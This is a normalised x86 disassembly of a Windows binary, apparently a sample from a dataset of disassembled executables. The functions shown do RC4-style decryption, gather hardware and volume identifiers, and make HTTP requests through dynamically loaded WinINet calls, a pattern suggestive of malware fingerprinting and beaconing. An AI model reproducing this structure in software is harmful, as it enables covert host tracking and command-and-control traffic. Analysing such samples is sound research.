mov [ ecx + edi ] al
inc ecx
mov [ esi + edi ] bl
mov [ ebp - 0x4 ] ecx
cmp ecx 0x100
jl r-xdata
dec esi
or esi 0xffffff00
inc esi
mov eax ecx
cdq
idiv [ ebp - 0x8 ]
mov bl [ ecx + edi ]
movzx ecx bl
movzx eax [ edx + r--data ]
add esi eax
add esi ecx
and esi 0x800000ff
jns r-xdata
pop esi
or eax 0xffffffff
pop ebx
jmp r-xdata
pop edi
leave
retn
sub_4099b0
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
test esi esi
je r-xdata
xor eax eax
mov edx esi
lea ecx [ edx + 0x1 ]
mov al [ edx ]
inc edx
test al al
jne r-xdata
sub edx ecx
test edx edx
jle r-xdata
mov ecx edx
and ecx 0x80000001
jns r-xdata
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
mov eax edx
cdq
sub eax edx
mov ebx eax
sar ebx 0x1
push ebx
mov [ ebp - 0x8 ] ebx
call sub_40e73f
xor edi edi
pop ecx
mov edx eax
test ebx ebx
jle r-xdata
mov eax edx
jmp r-xdata
push 0x37
pop ebx
mov [ ebp - 0x4 ] ebx
pop edi
pop esi
pop ebx
leave
retn
push edx
call j_sub_40e8f2#2
pop ecx
cmp [ esi + edi * 2 + 0x1 ] 0x41
movsx eax [ esi + edi * 2 + 0x1 ]
push 0x30
pop ecx
cmovge ecx [ ebp - 0x4 ]
sub eax ecx
cmp eax 0x10
jge r-xdata
shl bl 0x4
add bl al
mov [ edi + edx ] bl
inc edi
push 0x37
pop ebx
cmp edi [ ebp - 0x8 ]
jl r-xdata
cmp [ esi + edi * 2 ] 0x41
push 0x30
pop ecx
cmovge ecx ebx
movsx ebx [ esi + edi * 2 ]
sub ebx ecx
cmp ebx 0x10
jge r-xdata
sub_409a56
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0xc ] edx
test edi edi
je r-xdata
xor eax eax
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
push 0x100
call sub_40e73f
mov edx [ ebp + 0xc ]
mov esi eax
push esi
call sub_40993f
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0xc ]
xor ecx ecx
mov [ ebp - 0x4 ] ecx
test eax eax
jle r-xdata
mov eax [ ebp + 0x14 ]
mov edx [ ebp - 0xc ]
push esi
mov [ eax ] edx
call j_sub_40e8f2#2
pop ecx
or eax 0xffffffff
jmp r-xdata
sub edi ebx
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
leave
retn
mov dl [ ecx + esi ]
movzx eax dl
add eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
and eax 0x800000ff
jns r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
mov [ ebp - 0x4 ] eax
mov al [ eax + esi ]
mov [ ecx + esi ] al
mov eax [ ebp - 0x4 ]
mov [ eax + esi ] dl
movzx ecx [ ecx + esi ]
movzx eax dl
add ecx eax
and ecx 0x800000ff
jns r-xdata
dec eax
or eax 0xffffff00
inc eax
mov al [ ecx + esi ]
xor al [ edi + ebx ]
mov ecx [ ebp - 0x10 ]
mov [ ebx ] al
inc ebx
dec [ ebp - 0x8 ]
jne r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
inc ecx
and ecx 0x800000ff
jns r-xdata
sub_409b26
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
test esi esi
je r-xdata
xor eax eax
lea edx [ ecx + 0x1 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
test cl 0x1
jne r-xdata
mov ecx esi
call sub_4099b0
mov edx esi
mov ebx eax
lea eax [ edx + 0x1 ]
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx eax
shr edx 0x1
inc edx
push edx
call sub_40e73f
and [ ebp - 0x4 ] 0x0
pop ecx
mov ecx esi
mov edi eax
lea edx [ ecx + 0x1 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
shr ecx 0x1
inc ecx
push ecx
push 0x0
push edi
call sub_414160
add esp 0xc
lea ecx [ esi + 0x1 ]
mov al [ esi ]
inc esi
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
sub esi ecx
push edi
push 0x100
push ecx
shr esi 0x1
mov edx esi
mov ecx ebx
call sub_409a56
add esp 0x10
push ebx
test eax eax
jne r-xdata
call j_sub_40e8f2#2
mov eax [ ebp - 0x4 ]
pop ecx
mov [ eax + edi ] 0x0
mov eax edi
jmp r-xdata
call j_sub_40e8f2#2
push edi
call j_sub_40e8f2#2
pop ecx
pop ecx
pop edi
pop esi
pop ebx
leave
retn
sub_409bdb
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ GlobalAlloc@IAT ]
push edi
push 0x20
push 0x40
mov [ ebp - 0x14 ] edx
mov ebx ecx
call esi
push 0x210
mov edi eax
push 0x40
mov [ ebp - 0x10 ] edi
call esi
and [ edi ] 0x0
push 0x0
mov esi eax
lea eax [ ebp - 0x8 ]
push eax
push 0x210
push esi
push 0x20
push edi
push 0x7c088
mov [ edi + 0xa ] 0xec
push ebx
mov [ ebp - 0xc ] esi
mov [ esi ] 0x200
call [ DeviceIoControl@IAT ]
mov edi [ ebp - 0x14 ]
push [ ebp - 0xc ]
add esi 0x10
mov ecx 0x80
[ edi ] [ esi ]
mov esi [ GlobalFree@IAT ]
mov ebx eax
call esi
push [ ebp - 0x10 ]
call esi
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
sub_409c6a
push esi
mov esi edx
push edi
mov edi ecx
test esi esi
jle r-xdata
xor ecx ecx
test esi esi
jle r-xdata
lea edx [ esi - 0x1 ]
shr edx 0x1
push ebx
lea ebx [ edi + 0x1 ]
inc edx
mov eax esi
sub eax ecx
push eax
lea eax [ ecx + edi ]
push eax
push edi
call sub_40e0b0
add esp 0xc
jmp r-xdata
cmp [ ecx + edi ] 0x20
jne r-xdata
mov cl [ ebx - 0x1 ]
mov al [ ebx ]
mov [ ebx - 0x1 ] al
mov [ ebx ] cl
lea ebx [ ebx + 0x2 ]
dec edx
jne r-xdata
pop ebx
dec esi
jns r-xdata
inc ecx
cmp ecx esi
jl r-xdata
cmp [ esi + edi ] 0x20
jne r-xdata
pop edi
pop esi
retn
mov [ esi + edi ] 0x0
sub_409cc4
push 0x2c
mov eax sub_41d440
call sub_41089b
mov esi ecx
mov [ ebp - 0x30 ] esi
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x38 ] ebx
cmp [ edx + 0x10 ] ebx
jbe r-xdata
push 0xffffffff
push ebx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push edx
mov [ esi ] bl
call sub_40274f
cmp [ edi + 0x10 ] ebx
jbe r-xdata
push 0xffffffff
push ebx
push edx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_40274f
mov [ ebp - 0x4 ] ebx
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push eax
mov ecx esi
mov [ esi ] bl
call sub_4020fe
lea ecx [ ebp - 0x2c ]
call sub_40203c
jmp r-xdata
mov esi [ ebp - 0x34 ]
push [ edi + 0x10 ]
lea ecx [ ebp - 0x2c ]
push ebx
push eax
call sub_40a442
cmp eax 0xffffffff
je r-xdata
mov eax esi
call sub_41084a
retn
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov ebx [ esi + 0x10 ]
push 0xffffffff
push 0x0
push esi
push [ edi + 0x10 ]
lea ecx [ ebp - 0x2c ]
push eax
add ebx eax
call sub_4095f0
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov esi [ ebp - 0x30 ]
xor ebx ebx
push [ edi + 0x10 ]
lea ecx [ ebp - 0x2c ]
push ebx
push eax
call sub_40a442
cmp eax 0xffffffff
jne r-xdata
sub_409da9
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x20 ] 0x0
push ebx
push esi
push edi
mov esi ecx
test edx edx
jne r-xdata
push edx
lea ecx [ ebp - 0x1c ]
call sub_401fea
mov edx [ ebp - 0xc ]
xor ecx ecx
test edx edx
je r-xdata
push r--data
call sub_401fea
jmp r-xdata
and [ esi + 0x10 ] 0x0
lea eax [ ebp - 0x1c ]
mov [ esi + 0x14 ] 0xf
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_4020fe
lea ecx [ ebp - 0x1c ]
call sub_40203c
mov edi [ ebp - 0x8 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
cmp eax 0x41
jb r-xdata
cmp eax 0x39
jbe r-xdata
cmp eax 0x61
jb r-xdata
cmp eax 0x5a
jbe r-xdata
inc ecx
cmp ecx edx
jb r-xdata
cmp eax 0x2d
je r-xdata
cmp eax 0x7a
jbe r-xdata
cmp edi 0x10
lea eax [ ebp - 0x1c ]
cmovae eax ebx
movsx ax [ eax + ecx ]
movzx eax ax
cmp eax 0x30
jb r-xdata
cmp edi 0x10
lea eax [ ebp - 0x1c ]
cmovae eax ebx
mov [ eax + ecx ] 0x58
mov edi [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov ebx [ ebp - 0x1c ]
sub_409e6e
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor esi esi
push esi
lea eax [ ebp - 0x2c ]
push r--data
push eax
mov ebx edx
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0x2c ]
push esi
push esi
push 0x3
push esi
push 0x3
push 0xc0000000
push eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push edi
mov edx ebx
mov ecx esi
call sub_409bdb
mov edi eax
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax edi
pop edi
push 0x14
lea ecx [ ebx + 0x14 ]
pop edx
call sub_409c6a
push 0x28
lea ecx [ ebx + 0x36 ]
pop edx
call sub_409c6a
push 0x8
lea ecx [ ebx + 0x2e ]
pop edx
call sub_409c6a
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
sub_409f01
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
xor eax eax
push r--data
inc eax
xor edi edi
push r--data
mov [ ebp - 0x14 ] edi
mov [ ebp - 0xc ] 0x208
mov [ ebp - 0x10 ] eax
call [ GetModuleHandleW@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov esi eax
mov [ ebp - 0x8 ] edi
test esi esi
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push 0x20019
push edi
push r--data
push 0x80000002
call [ RegOpenKeyExW@IAT ]
lea eax [ ebp - 0x8 ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call esi
test eax eax
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push ebx
lea eax [ ebp - 0x10 ]
push eax
push edi
push r--data
push [ ebp - 0x14 ]
call [ RegQueryValueExW@IAT ]
test eax eax
push 0x1
pop eax
cmove edi eax
cmp [ ebp - 0x8 ] edi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
push [ ebp - 0x14 ]
call [ RegCloseKey@IAT ]
mov esi [ RegOpenKeyExW@IAT ]
lea eax [ ebp - 0x14 ]
push eax
push 0x20219
push edi
push r--data
push 0x80000002
call esi
lea eax [ ebp - 0x14 ]
push eax
push 0x20219
push edi
push r--data
push 0x80000002
call esi
jmp r-xdata
test eax eax
jne r-xdata
sub_409ff1
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push esi
mov esi ecx
mov eax 0x1
xor edx edx
cpuid
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push r--data
push 0x208
push esi
call sub_40eb2a
xor eax eax
add esp 0x14
inc eax
jmp r-xdata
pop esi
pop ebx
leave
retn
sub_40a041
push 0x6bc
mov eax sub_41d410
call sub_41089b
mov ebx ecx
mov [ ebp - 0x474 ] ebx
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x6b0 ]
call sub_409e6e
test eax eax
je r-xdata
mov edi rw-data
mov edx edi
xor esi esi
lea ecx [ edx + 0x2 ]
push 0x9
pop ecx
xor eax eax
mov [ ebp - 0x60 ] ax
lea edi [ ebp - 0x5e ]
[ edi ]
stosw [ edi ]
push 0x9
pop ecx
xor eax eax
mov [ ebp - 0x38 ] ax
lea edi [ ebp - 0x36 ]
[ edi ]
stosw [ edi ]
mov ecx 0xff
push ecx
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x478 ]
push eax
lea eax [ ebp - 0x4ac ]
push eax
lea eax [ ebp - 0x474 ]
push eax
push ecx
lea eax [ ebp - 0x60 ]
push eax
xor esi esi
push esi
call [ GetVolumeInformationW@IAT ]
xor eax eax
push 0x40e
mov [ ebp - 0x470 ] ax
lea eax [ ebp - 0x46e ]
push esi
push eax
call sub_414160
add esp 0xc
lea ecx [ ebp - 0x470 ]
call sub_409ff1
test eax eax
jne r-xdata
lea eax [ ebp - 0x69c ]
push eax
lea ecx [ ebp - 0x490 ]
call sub_401fea
mov edi r--data
xor ebx ebx
push edi
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] ebx
call sub_401fea
mov esi r--data
push esi
lea ecx [ ebp - 0x6c8 ]
mov [ ebp - 0x4 ] 0x1
call sub_401fea
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x6c8 ]
push eax
lea edx [ ebp - 0x490 ]
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x2
call sub_409cc4
pop ecx
pop ecx
push eax
lea ecx [ ebp - 0x490 ]
call sub_4091e5
lea ecx [ ebp - 0x28 ]
call sub_40203c
lea ecx [ ebp - 0x6c8 ]
call sub_40203c
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] bl
call sub_40203c
lea eax [ ebp - 0x67a ]
push eax
lea ecx [ ebp - 0x4a8 ]
call sub_401fea
push edi
lea ecx [ ebp - 0x6c8 ]
mov [ ebp - 0x4 ] 0x3
call sub_401fea
push esi
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0x4
call sub_401fea
lea eax [ ebp - 0x6c8 ]
push eax
lea eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x4a8 ]
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x5
call sub_409cc4
pop ecx
pop ecx
push eax
lea ecx [ ebp - 0x4a8 ]
call sub_4091e5
lea ecx [ ebp - 0x28 ]
call sub_40203c
lea ecx [ ebp - 0x50 ]
call sub_40203c
lea ecx [ ebp - 0x6c8 ]
mov [ ebp - 0x4 ] 0x3
call sub_40203c
cmp [ ebp - 0x47c ] 0x10
lea edx [ ebp - 0x490 ]
cmovae edx [ ebp - 0x490 ]
lea ecx [ ebp - 0x28 ]
call sub_409da9
push eax
lea ecx [ ebp - 0x490 ]
call sub_4091e5
lea ecx [ ebp - 0x28 ]
call sub_40203c
cmp [ ebp - 0x494 ] 0x10
lea edx [ ebp - 0x4a8 ]
cmovae edx [ ebp - 0x4a8 ]
lea ecx [ ebp - 0x28 ]
call sub_409da9
push eax
lea ecx [ ebp - 0x4a8 ]
call sub_4091e5
lea ecx [ ebp - 0x28 ]
call sub_40203c
cmp [ ebp - 0x47c ] 0x10
push ebx
push ebx
push 0xffffffff
lea eax [ ebp - 0x490 ]
cmovae eax [ ebp - 0x490 ]
push eax
push ebx
mov ebx [ MultiByteToWideChar@IAT ]
push 0xfde9
call ebx
mov edi eax
xor ecx ecx
push 0x2
lea esi [ edi + 0x1 ]
pop edx
mov eax esi
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_40e092
pop ecx
push esi
xor esi esi
push esi
push eax
mov [ ebp - 0x478 ] eax
call sub_414160
add esp 0xc
cmp [ ebp - 0x47c ] 0x10
push edi
push [ ebp - 0x478 ]
lea ecx [ ebp - 0x490 ]
cmovae ecx [ ebp - 0x490 ]
push edi
push ecx
push esi
mov edi 0xfde9
push edi
call ebx
cmp [ ebp - 0x494 ] 0x10
push esi
push esi
push 0xffffffff
lea eax [ ebp - 0x4a8 ]
cmovae eax [ ebp - 0x4a8 ]
push eax
push esi
push edi
call ebx
mov edi eax
xor ecx ecx
push 0x2
lea esi [ edi + 0x1 ]
pop edx
mov eax esi
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_40e092
pop ecx
push esi
xor esi esi
mov ebx eax
push esi
push ebx
call sub_414160
add esp 0xc
cmp [ ebp - 0x494 ] 0x10
push edi
push ebx
push edi
lea ecx [ ebp - 0x4a8 ]
cmovae ecx [ ebp - 0x4a8 ]
push ecx
push esi
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov edi [ ebp - 0x474 ]
push 0x618
push esi
push edi
call sub_414160
mov esi [ ebp - 0x478 ]
add esp 0xc
push esi
push ebx
push r--data
push 0x30c
push edi
call sub_40eb2a
add esp 0x14
push ebx
call j_sub_40e8f2
pop ecx
push esi
call j_sub_40e8f2
pop ecx
lea ecx [ ebp - 0x4a8 ]
call sub_40203c
lea ecx [ ebp - 0x490 ]
call sub_40203c
mov ebx edi
xor esi esi
jmp r-xdata
mov ax [ edx ]
add edx 0x2
cmp ax si
jne r-xdata
sub edx ecx
sar edx 0x1
push edx
push edi
push 0x30c
push ebx
call sub_40f45d
add esp 0x10
xor eax eax
mov [ ebx + 0x616 ] ax
jmp r-xdata
push 0x618
push esi
push ebx
call sub_414160
add esp 0xc
lea eax [ ebp - 0x470 ]
push [ ebp - 0x474 ]
push eax
push r--data
push 0x30c
push ebx
call sub_40eb2a
add esp 0x14
push ecx
lea eax [ ebp - 0x470 ]
push eax
push ecx
call sub_409f01
add esp 0xc
mov ecx ebx
lea edx [ ecx + 0x2 ]
mov al 0x1
call sub_41084a
retn
mov ax [ ecx ]
add ecx 0x2
cmp ax si
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
push ebx
push 0x104
push rw-data
call sub_40f45d
add esp 0x10
xor ecx ecx
mov [ rw-data ] cx
sub_40a442
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
test edx edx
jne r-xdata
push ebx
push edi
mov edi [ esi + 0x10 ]
cmp ecx edi
jae r-xdata
cmp ecx [ esi + 0x10 ]
ja r-xdata
or eax 0xffffffff
sub edi ecx
cmp edx edi
ja r-xdata
mov eax ecx
jmp r-xdata
xor eax eax
inc eax
sub eax edx
add edi eax
cmp [ esi + 0x14 ] 0x10
jb r-xdata
pop esi
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
push edi
movsx eax [ eax ]
push eax
push ecx
call sub_40f3b0
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
add ecx eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
push ebx
call sub_41b04b
add esp 0xc
test eax eax
je r-xdata
sub ebx esi
mov eax ebx
jmp r-xdata
mov esi [ esi ]
mov ecx [ ebp + 0xc ]
sub ecx ebx
dec ecx
add edi ecx
lea ecx [ ebx + 0x1 ]
jmp r-xdata
pop edi
pop ebx
mov [ ebp + 0xc ] ecx
test edi edi
je r-xdata
sub_40a4f0
push 0x4
mov eax sub_41d480
call sub_410868
mov esi ecx
mov [ ebp - 0x10 ] esi
xor ebx ebx
lea eax [ ebp + 0x8 ]
inc ebx
mov [ ebp - 0x4 ] ebx
push eax
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_40205d
lea eax [ ebp + 0x20 ]
push eax
lea ecx [ esi + 0x1c ]
mov [ ebp - 0x4 ] 0x2
call sub_40205d
xor edi edi
push edi
push ebx
lea ecx [ ebp + 0x8 ]
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x3c ] edi
mov [ esi + 0x40 ] edi
mov [ esi + 0x44 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
call sub_4023e7
push edi
push ebx
lea ecx [ ebp + 0x20 ]
call sub_4023e7
mov eax esi
call sub_410836
retn 0x30
sub_40a55e
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40a57d
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_40e8f2#2
pop ecx
sub_40a57d
push esi
push edi
mov edi ecx
lea esi [ edi + 0x1c ]
mov [ edi ] r--data
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push 0x0
push 0x1
mov ecx esi
call sub_4023e7
push 0x0
push 0x1
lea ecx [ edi + 0x4 ]
call sub_4023e7
pop edi
pop esi
retn
mov eax [ edi + 0x4c ]
test eax eax
je r-xdata
push eax
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
cmp eax 0xffffffff
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_40a5ce
push 0x4c0
mov eax sub_41d4fa
call sub_410907
mov ebx ecx
mov [ ebp - 0x47c ] ebx
cmp [ ebx + 0x14 ] 0x0
mov [ ebp - 0x484 ] ebx
je r-xdata
xor eax eax
mov esi 0x208
push esi
xor edi edi
lea eax [ ebp - 0x424 ]
push edi
push eax
call sub_414160
push esi
lea eax [ ebp - 0x21c ]
push edi
push eax
call sub_414160
push 0x3c
pop esi
push esi
lea eax [ ebp - 0x474 ]
push edi
push eax
call sub_414160
lea eax [ ebp - 0x424 ]
mov [ ebp - 0x464 ] eax
lea eax [ ebp - 0x21c ]
mov [ ebp - 0x448 ] eax
lea eax [ ebx + 0x4 ]
mov ecx 0x103
add esp 0x24
cmp [ eax + 0x14 ] 0x8
mov [ ebp - 0x474 ] esi
mov [ ebp - 0x440 ] edi
mov [ ebp - 0x43c ] edi
mov [ ebp - 0x460 ] ecx
mov [ ebp - 0x450 ] edi
mov [ ebp - 0x44c ] edi
mov [ ebp - 0x470 ] edi
mov [ ebp - 0x46c ] edi
mov [ ebp - 0x444 ] ecx
jb r-xdata
lea ecx [ ebp - 0x474 ]
push ecx
push 0x80000000
push [ ebx + 0x14 ]
push eax
call [ InternetCrackUrlW@IAT ]
test eax eax
je r-xdata
mov eax [ eax ]
mov [ ebp - 0x4 ] 0x1
mov edi [ LoadLibraryW@IAT ]
push r--data
call edi
mov esi eax
mov [ ebp - 0x490 ] esi
test esi esi
je r-xdata
push r--data
push esi
call [ GetProcAddress@IAT ]
test eax eax
jne r-xdata
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push r--data
call eax
mov [ ebx + 0x34 ] eax
test eax eax
jne r-xdata
push esi
call [ FreeLibrary@IAT ]
push r--data
mov [ ebp - 0x4 ] 0x2
call edi
mov edi eax
mov [ ebp - 0x48c ] edi
test edi edi
je r-xdata
lea eax [ ebp - 0x478 ]
push eax
lea ecx [ ebp - 0x4b4 ]
mov [ ebp - 0x478 ] r--data
call sub_40f72b
push r--data
lea eax [ ebp - 0x4b4 ]
mov edi [ FreeLibrary@IAT ]
push r--data
push edi
call [ GetProcAddress@IAT ]
test eax eax
jne r-xdata
xor edx edx
push edx
push edx
push 0x3
mov ecx r--data
push ecx
push ecx
push edx
lea ecx [ ebp - 0x424 ]
push ecx
push [ ebx + 0x34 ]
call eax
mov [ ebx + 0x38 ] eax
test eax eax
jne r-xdata
push edi
mov edi [ FreeLibrary@IAT ]
call edi
jmp r-xdata
push r--data
mov [ ebp - 0x4 ] 0x3
call [ LoadLibraryW@IAT ]
mov ebx eax
mov [ ebp - 0x488 ] ebx
test ebx ebx
je r-xdata
lea eax [ ebp - 0x478 ]
push eax
lea ecx [ ebp - 0x4cc ]
mov [ ebp - 0x478 ] r--data
call sub_40f72b
push r--data
lea eax [ ebp - 0x4cc ]
jmp r-xdata
push esi
call edi
jmp r-xdata
mov ebx [ FreeLibrary@IAT ]
jmp r-xdata
push r--data
push ebx
call [ GetProcAddress@IAT ]
mov ecx eax
test ecx ecx
je r-xdata
push eax
call sub_4107db
push edi
call ebx
push esi
call ebx
jmp r-xdata
push ebx
mov ebx [ FreeLibrary@IAT ]
call ebx
xor eax eax
push eax
push 0x80000100
push eax
push eax
push r--data
lea eax [ ebp - 0x21c ]
push eax
mov eax [ ebp - 0x47c ]
push r--data
push [ eax + 0x38 ]
call ecx
mov ecx eax
mov eax [ ebp - 0x47c ]
mov [ eax + 0x3c ] ecx
test ecx ecx
jne r-xdata
push r--data
mov [ ebp - 0x4 ] 0x4
call [ LoadLibraryW@IAT ]
mov [ ebp - 0x480 ] eax
test eax eax
je r-xdata
lea eax [ ebp - 0x478 ]
push eax
lea ecx [ ebp - 0x49c ]
mov [ ebp - 0x478 ] r--data
call sub_40f72b
push r--data
lea eax [ ebp - 0x49c ]
jmp r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
mov ecx eax
test ecx ecx
je r-xdata
push [ ebp - 0x480 ]
call [ FreeLibrary@IAT ]
xor eax eax
push eax
push eax
push eax
push eax
mov eax [ ebp - 0x47c ]
push [ eax + 0x3c ]
call ecx
test eax eax
jne r-xdata
and [ ebp - 0x428 ] 0x0
mov [ ebp - 0x42c ] 0x4
push r--data
mov [ ebp - 0x4 ] 0x5
call [ LoadLibraryW@IAT ]
mov [ ebp - 0x478 ] eax
test eax eax
je r-xdata
lea eax [ ebp - 0x478 ]
push eax
lea ecx [ ebp - 0x4c0 ]
mov [ ebp - 0x478 ] r--data
call sub_40f72b
push r--data
lea eax [ ebp - 0x4c0 ]
jmp r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
mov ecx eax
test ecx ecx
jne r-xdata
push 0x0
lea eax [ ebp - 0x42c ]
push eax
lea eax [ ebp - 0x428 ]
push eax
mov eax [ ebp - 0x47c ]
push 0x20000013
push [ eax + 0x3c ]
call ecx
test eax eax
jne r-xdata
push [ ebp - 0x478 ]
call [ FreeLibrary@IAT ]
cmp [ ebp - 0x428 ] 0x12c
push [ ebp - 0x478 ]
sbb eax eax
neg eax
mov [ ebp - 0x47c ] eax
call [ FreeLibrary@IAT ]
push [ ebp - 0x480 ]
call [ FreeLibrary@IAT ]
push ebx
mov ebx [ FreeLibrary@IAT ]
call ebx
push edi
call ebx
push esi
call ebx
mov eax [ ebp - 0x47c ]
jmp r-xdata
lea eax [ ebp - 0x47c ]
push eax
lea ecx [ ebp - 0x4a8 ]
mov [ ebp - 0x47c ] r--data
call sub_40f72b
push r--data
lea eax [ ebp - 0x4a8 ]
jmp r-xdata
call sub_410859
retn
sub_40a9f9
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
mov edi [ InternetCloseHandle@IAT ]
je r-xdata
cmp [ esi + 0x38 ] 0x0
je r-xdata
push [ esi + 0x3c ]
call edi
and [ esi + 0x3c ] 0x0
cmp [ esi + 0x34 ] 0x0
je r-xdata
push [ esi + 0x38 ]
call edi
and [ esi + 0x38 ] 0x0
pop edi
pop esi
retn
push [ esi + 0x34 ]
call edi
and [ esi + 0x34 ] 0x0
sub_40aa33
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
mov edi ecx
xor eax eax
cmp [ edi + 0x3c ] eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_40e09b
leave
retn
push esi
push 0x3e
mov [ ebp - 0x44 ] ax
xor esi esi
lea eax [ ebp - 0x42 ]
push esi
push eax
call sub_414160
add esp 0xc
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
push 0x5
push [ edi + 0x3c ]
mov [ ebp - 0x48 ] 0x40
mov [ ebp - 0x4c ] esi
call [ HttpQueryInfoW@IAT ]
test eax eax
je r-xdata
mov [ edi + 0x40 ] esi
lea eax [ ebp - 0x44 ]
push eax
call sub_40eb4f
pop ecx
mov [ edi + 0x40 ] eax
inc esi
jmp r-xdata
mov eax esi
pop esi
sub_40aaab
push 0x820
mov eax sub_41d49b
call sub_410907
mov esi ecx
mov [ ebp - 0x82c ] esi
call sub_40a5ce
mov ecx esi
test eax eax
jne r-xdata
call sub_40aa33
test eax eax
jne r-xdata
call sub_40a9f9
xor edi edi
cmp [ esi + 0x2c ] edi
je r-xdata
mov ecx esi
jmp r-xdata
call sub_410859
retn
lea eax [ esi + 0x1c ]
